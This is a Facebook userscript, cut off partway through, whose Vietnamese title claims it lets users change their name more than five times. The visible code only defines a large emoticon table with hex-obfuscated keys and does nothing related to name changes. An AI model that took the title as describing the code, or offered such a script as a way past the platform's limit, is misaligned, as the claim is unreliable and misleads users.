// ==UserScript==
// @name            Phần Mềm Đổi Tên Quá 5 Lần Trên FaceBook
// @description     All about Facebook Kòi Chảnh Chó
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function () {
    if (!document['querySelector']('#pageNav')) {
        return;
    };
    var _0x3384x1 = [{
        "\x63\x68\x61\x72\x73": ' :) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_smile',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi t\u01B0\u01A1i'
    }, {
        "\x63\x68\x61\x72\x73": ' :( ',
        "\x63\x6C\x61\x73\x73": 'emoticon_frown',
        "\x6E\x61\x6D\x65": 'Bu\u1ED3n ch\xE1n'
    }, {
        "\x63\x68\x61\x72\x73": ' :P ',
        "\x63\x6C\x61\x73\x73": 'emoticon_tongue',
        "\x6E\x61\x6D\x65": 'L\xE8 l\u01B0\u1EE1i'
    }, {
        "\x63\x68\x61\x72\x73": ' :D ',
        "\x63\x6C\x61\x73\x73": 'emoticon_grin',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi toe'
    }, {
        "\x63\x68\x61\x72\x73": ' :o ',
        "\x63\x6C\x61\x73\x73": 'emoticon_gasp',
        "\x6E\x61\x6D\x65": 'Ng\u1EA1c nhi\xEAn'
    }, {
        "\x63\x68\x61\x72\x73": ' ;) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_wink',
        "\x6E\x61\x6D\x65": 'Nh\xE1y m\u1EAFt'
    }, {
        "\x63\x68\x61\x72\x73": ' :v ',
        "\x63\x6C\x61\x73\x73": 'emoticon_pacman',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi h\xE1 mi\u1EC7ng'
    }, {
        "\x63\x68\x61\x72\x73": ' >:( ',
        "\x63\x6C\x61\x73\x73": 'emoticon_grumpy',
        "\x6E\x61\x6D\x65": 'Nh\u0103n m\u1EB7t'
    }, {
        "\x63\x68\x61\x72\x73": ' :/ ',
        "\x63\x6C\x61\x73\x73": 'emoticon_unsure',
        "\x6E\x61\x6D\x65": 'M\u1EBFu'
    }, {
        "\x63\x68\x61\x72\x73": ' :\'( ',
        "\x63\x6C\x61\x73\x73": 'emoticon_cry',
        "\x6E\x61\x6D\x65": 'Kh\xF3c'
    }, {
        "\x63\x68\x61\x72\x73": ' ^_^ ',
        "\x63\x6C\x61\x73\x73": 'emoticon_kiki',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi t\xEDt m\u1EAFt'
    }, {
        "\x63\x68\x61\x72\x73": ' 8) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_glasses',
        "\x6E\x61\x6D\x65": '\u0110eo k\xEDnh tr\u1EAFng'
    }, {
        "\x63\x68\x61\x72\x73": ' B| ',
        "\x63\x6C\x61\x73\x73": 'emoticon_sunglasses',
        "\x6E\x61\x6D\x65": '\u0110eo k\xEDnh \u0111en'
    }, {
        "\x63\x68\x61\x72\x73": ' <3 ',
        "\x63\x6C\x61\x73\x73": 'emoticon_heart',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim'
    }, {
        "\x63\x68\x61\x72\x73": ' 3:) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_devil',
        "\x6E\x61\x6D\x65": 'Qu\u1EF7 s\u1EE9'
    }, {
        "\x63\x68\x61\x72\x73": ' O:) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_angel',
        "\x6E\x61\x6D\x65": 'Thi\xEAn th\u1EA7n'
    }, {
        "\x63\x68\x61\x72\x73": ' -_- ',
        "\x63\x6C\x61\x73\x73": 'emoticon_squint',
        "\x6E\x61\x6D\x65": 'Nh\u1EAFm m\u1EAFt l\u1EA1i'
    }, {
        "\x63\x68\x61\x72\x73": ' o.O ',
        "\x63\x6C\x61\x73\x73": 'emoticon_confused',
        "\x6E\x61\x6D\x65": 'Tr\u1EE3n tr\xF2n m\u1EAFt'
    }, {
        "\x63\x68\x61\x72\x73": ' >:o ',
        "\x63\x6C\x61\x73\x73": 'emoticon_upset',
        "\x6E\x61\x6D\x65": 'Kh\xF3 ch\u1ECBu qu\xE1'
    }, {
        "\x63\x68\x61\x72\x73": ' :3 ',
        "\x63\x6C\x61\x73\x73": 'emoticon_colonthree',
        "\x6E\x61\x6D\x65": 'Kh\xF4ng quan t\xE2m'
    }, {
        "\x63\x68\x61\x72\x73": ' (y) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_like',
        "\x6E\x61\x6D\x65": 'Th\xEDch'
    }, {
        "\x63\x68\x61\x72\x73": ' :* ',
        "\x63\x6C\x61\x73\x73": 'emoticon emoticon_kiss',
        "\x6E\x61\x6D\x65": 'H\xF4n c\xE1i coi'
    }, {
        "\x63\x68\x61\x72\x73": ' (^^^) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_shark',
        "\x6E\x61\x6D\x65": 'C\xE1 heo t\u1EE9c gi\u1EADn'
    }, {
        "\x63\x68\x61\x72\x73": ' :|] ',
        "\x63\x6C\x61\x73\x73": 'emoticon_robot',
        "\x6E\x61\x6D\x65": 'Robot'
    }, {
        "\x63\x68\x61\x72\x73": ' <(") ',
        "\x63\x6C\x61\x73\x73": 'emoticon_penguin',
        "\x6E\x61\x6D\x65": 'Chim c\xE1nh c\u1EE5t'
    }, {
        "\x63\x68\x61\x72\x73": ' :poop: ',
        "\x63\x6C\x61\x73\x73": 'emoticon_poop',
        "\x6E\x61\x6D\x65": '\u0102n shit nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' :putnam: ',
        "\x63\x6C\x61\x73\x73": 'emoticon_putnam',
        "\x6E\x61\x6D\x65": 'Th\u1EBF c\u01A1 \xE1?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF02 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c0',
        "\x6E\x61\x6D\x65": 'M\u01B0a r\u1ED3i, \xF4 n\xE8'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF0A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c1',
        "\x6E\x61\x6D\x65": 'S\xF3ng bi\u1EC3n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF19 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c2',
        "\x6E\x61\x6D\x65": 'V\u1EA7ng tr\u0103ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF1F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c3',
        "\x6E\x61\x6D\x65": 'Ng\xF4i sao'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF31 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c4',
        "\x6E\x61\x6D\x65": 'C\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF34 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c5',
        "\x6E\x61\x6D\x65": 'C\xE2y c\xF4 \u0111\u01A1n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF35 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c6',
        "\x6E\x61\x6D\x65": 'X\u01B0\u01A1ng r\u1ED3ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF37 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c7',
        "\x6E\x61\x6D\x65": 'Hoa Tulip'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF38 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c8',
        "\x6E\x61\x6D\x65": 'Hoa 5 c\xE1nh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF39 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c9',
        "\x6E\x61\x6D\x65": 'Hoa h\u1ED3ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF3A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ca',
        "\x6E\x61\x6D\x65": 'C\xE2y hoa tr\xF2n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF3B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cb',
        "\x6E\x61\x6D\x65": 'Hoa h\u01B0\u1EDBng d\u01B0\u01A1ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF3E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cc',
        "\x6E\x61\x6D\x65": 'C\xE2y l\xFAa'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF40 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cd',
        "\x6E\x61\x6D\x65": 'Hoa 4 m\xF9a'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF41 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ce',
        "\x6E\x61\x6D\x65": 'L\xE1 phong'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF42 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cf',
        "\x6E\x61\x6D\x65": 'L\xE1 Fallen'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF43 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cg',
        "\x6E\x61\x6D\x65": 'L\xE1 xanh tr\u01B0\u1EDBc gi\xF3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF4A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ch',
        "\x6E\x61\x6D\x65": 'Qu\u1EA3 qu\xFDt'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF4E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ci',
        "\x6E\x61\x6D\x65": 'T\xE1o \u0111\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF53 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cj',
        "\x6E\x61\x6D\x65": 'D\xE2u t\xE2y, \u0103n \u0111i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF54 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ck',
        "\x6E\x61\x6D\x65": 'B\xE1nh m\u1EF3 ba t\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF78 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cl',
        "\x6E\x61\x6D\x65": 'N\u01B0\u1EDBc hoa qu\u1EA3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF7A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cm',
        "\x6E\x61\x6D\x65": 'Bia'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF81 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cn',
        "\x6E\x61\x6D\x65": 'H\u1ED9p qu\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF83 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2co',
        "\x6E\x61\x6D\x65": 'Qu\u1EA3 b\xED ng\xF4'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF84 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cp',
        "\x6E\x61\x6D\x65": 'C\xE2y th\xF4ng Noel'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF85 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cq',
        "\x6E\x61\x6D\x65": '\xD4ng gi\xE0 Noel'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF88 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cr',
        "\x6E\x61\x6D\x65": 'B\xF3ng bay'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF89 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cs',
        "\x6E\x61\x6D\x65": 'K\xE8n cho Party'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF8D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ct',
        "\x6E\x61\x6D\x65": 'V\u01B0\u01A1ng mi\u1EC7ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF8E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cu',
        "\x6E\x61\x6D\x65": 'C\u1EB7p \u0111\xF4i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF8F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cv',
        "\x6E\x61\x6D\x65": '\u0110\xF4i c\xE1'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF90 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cw',
        "\x6E\x61\x6D\x65": 'K\u1EB9o gi\xF3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF93 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cx',
        "\x6E\x61\x6D\x65": 'M\u0169 c\u1EED nh\xE2n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDFB5 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cy',
        "\x6E\x61\x6D\x65": 'B\u1EA3n nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDFB6 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cz',
        "\x6E\x61\x6D\x65": 'N\u1ED1t nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDFBC ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c-',
        "\x6E\x61\x6D\x65": '\xC2m nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC0D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c_',
        "\x6E\x61\x6D\x65": 'Con r\u1EAFn'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC0E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d0',
        "\x6E\x61\x6D\x65": 'Con ng\u1EF1a'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC11 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d1',
        "\x6E\x61\x6D\x65": 'Con d\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC12 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d2',
        "\x6E\x61\x6D\x65": 'Con khi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC14 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d3',
        "\x6E\x61\x6D\x65": 'Con g\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC17 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d4',
        "\x6E\x61\x6D\x65": 'Con l\u1EE3n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC18 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d5',
        "\x6E\x61\x6D\x65": 'Con voi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC19 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d6',
        "\x6E\x61\x6D\x65": 'Con b\u1EA1ch tu\u1ED9c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC1A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d7',
        "\x6E\x61\x6D\x65": 'Con \u1ED1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC1B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d8',
        "\x6E\x61\x6D\x65": 'Con ch\u0103n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC1F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d9',
        "\x6E\x61\x6D\x65": 'Con c\xE1'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC20 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2da',
        "\x6E\x61\x6D\x65": 'C\xE1 c\u1EA3nh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC21 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2db',
        "\x6E\x61\x6D\x65": 'C\xE1 mang ph\xECnh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC25 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dc',
        "\x6E\x61\x6D\x65": 'G\xE0 con'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC26 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dd',
        "\x6E\x61\x6D\x65": 'Con chim'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC27 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2de',
        "\x6E\x61\x6D\x65": 'Chim c\xE1nh c\u1EE5t 2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC28 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2df',
        "\x6E\x61\x6D\x65": 'G\u1EA5u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC29 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dg',
        "\x6E\x61\x6D\x65": 'Ch\xF3 th\xE8 l\u01B0\u1EE1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dh',
        "\x6E\x61\x6D\x65": 'Con l\u1EA1c \u0111\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2di',
        "\x6E\x61\x6D\x65": 'Con c\xE1 voi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dj',
        "\x6E\x61\x6D\x65": 'M\u1EB7t chu\u1ED9t'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dk',
        "\x6E\x61\x6D\x65": 'M\u1EB7t b\xF2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dl',
        "\x6E\x61\x6D\x65": 'M\u1EB7t m\xE8o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC30 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dm',
        "\x6E\x61\x6D\x65": 'M\u1EB7t th\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC31 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dn',
        "\x6E\x61\x6D\x65": 'M\u1EB7t m\xE8o l\u01B0\u1EDDi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC33 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2do',
        "\x6E\x61\x6D\x65": 'C\xE1 voi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC34 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dp',
        "\x6E\x61\x6D\x65": 'M\u1EB7t ng\u1EF1a'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC35 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dq',
        "\x6E\x61\x6D\x65": 'M\u1EB7t kh\u1EC9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC37 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dr',
        "\x6E\x61\x6D\x65": 'M\u1EB7t l\u1EE3n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC38 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ds',
        "\x6E\x61\x6D\x65": 'M\u1EB7t \u1EBFch'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC39 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dt',
        "\x6E\x61\x6D\x65": 'M\u1EB7t chu\u1ED9t Hamster'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC3A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2du',
        "\x6E\x61\x6D\x65": 'M\u1EB7t ch\xF3 s\xF3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC3B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dv',
        "\x6E\x61\x6D\x65": 'M\u1EB7t g\u1EA5u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC3E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dw',
        "\x6E\x61\x6D\x65": 'B\xE0n ch\xE2n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC40 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dx',
        "\x6E\x61\x6D\x65": 'Ng\xF3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC42 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dy',
        "\x6E\x61\x6D\x65": 'H\xF3ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC43 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dz',
        "\x6E\x61\x6D\x65": 'M\u0169i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC44 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d-',
        "\x6E\x61\x6D\x65": 'H\xF4n mi\u1EBFng n\xE0o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC45 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d_',
        "\x6E\x61\x6D\x65": 'Te t\u1EDFn'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC46 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e0',
        "\x6E\x61\x6D\x65": '\u0110\u1EE9a comment \u1EDF tr\xEAn r\u1EA5t g\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC47 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e1',
        "\x6E\x61\x6D\x65": '\u0110\u1EE9a comment \u1EDF d\u01B0\u1EDBi r\u1EA5t g\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC48 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e2',
        "\x6E\x61\x6D\x65": 'B\xEAn tr\xE1i em \u01A1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC49 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e3',
        "\x6E\x61\x6D\x65": 'B\xEAn ph\u1EA3i em \u01A1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e4',
        "\x6E\x61\x6D\x65": 'N\xE0y th\xEC nh\xECn \u0111\u1EC3u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e5',
        "\x6E\x61\x6D\x65": 'V\u1ED7 tay ngay & lu\xF4n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e6',
        "\x6E\x61\x6D\x65": 'OK, anh hi\u1EC3u r\u1ED3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e7',
        "\x6E\x61\x6D\x65": '\u01AFng \xFD c\u1EE7a th\xEDm r\u1ED3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e8',
        "\x6E\x61\x6D\x65": '\xDD th\xEDm nh\u01B0 ***'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e9',
        "\x6E\x61\x6D\x65": '\u1EE6ng h\u1ED9 nhi\u1EC7t t\xECnh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC50 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ea',
        "\x6E\x61\x6D\x65": 'C\xF2ng tay em l\u1EA1i \u0111i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC66 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eb',
        "\x6E\x61\x6D\x65": 'HOT Boy'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC67 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ec',
        "\x6E\x61\x6D\x65": 'HOT Girl'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC68 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ed',
        "\x6E\x61\x6D\x65": 'X - Men'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC69 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ee',
        "\x6E\x61\x6D\x65": 'Ph\u1EE5 n\u1EEF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC6B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ef',
        "\x6E\x61\x6D\x65": 'N\u1EAFm tay c\xE1i xem n\xE0o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC6E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eg',
        "\x6E\x61\x6D\x65": 'Gi\u1EDD c\xE1c th\xEDm mu\u1ED1n g\xEC? C\u1EA3nh s\xE1t \u0111\xE2y'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC6F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eh',
        "\x6E\x61\x6D\x65": 'M\u1EDBi t\u1EADu c\xE1i tai th\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC71 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ei',
        "\x6E\x61\x6D\x65": '\u0110\u1EA7u m\u1EDBi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC72 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ej',
        "\x6E\x61\x6D\x65": 'Nh\xECn c\u0169ng \u0111\u1EADp chai ph\u1EBFt'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC73 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ek',
        "\x6E\x61\x6D\x65": '\u0110\xE2y \u0111\u1EADp h\u01A1n nha c\u01B0ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC74 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2el',
        "\x6E\x61\x6D\x65": '\u1EEA, c\xF2n m\xECnh th\xEC gi\xE0 cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC75 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2em',
        "\x6E\x61\x6D\x65": 'Em c\u0169ng gi\xE0 cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC76 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2en',
        "\x6E\x61\x6D\x65": 'M\xECnh c\xF2n nh\u1ECF qu\xE1, ch\u1ECBu kh\xF3 FA v\u1EADy'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC77 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eo',
        "\x6E\x61\x6D\x65": '\u0110\u1ED9i m\u0169 \u0111i l\xE0m n\xE0o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC78 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ep',
        "\x6E\x61\x6D\x65": 'C\xF4ng ch\xFAa'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eq',
        "\x6E\x61\x6D\x65": 'Ma \u0111\xE2y, xo\u1EAFn ch\u01B0a?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2er',
        "\x6E\x61\x6D\x65": 'Em l\xE0 thi\xEAn th\u1EA7n, nh\xECn em gi\u1ED1ng con \u0111\u1EA7n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2es',
        "\x6E\x61\x6D\x65": 'H\u1ED5 b\xE1o th\u1EBF n\xE0y \u0111\u01B0\u1EE3c ch\u01B0a?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2et',
        "\x6E\x61\x6D\x65": 'H\u1ED5 b\xE1o t\u1EEB m\u1EABu gi\xE1o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eu',
        "\x6E\x61\x6D\x65": '\u0110\u1EE7 c\u1EE9ng ch\u01B0a?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC80 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ev',
        "\x6E\x61\x6D\x65": '\u0110\u1EA7u l\xE2u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC82 ',
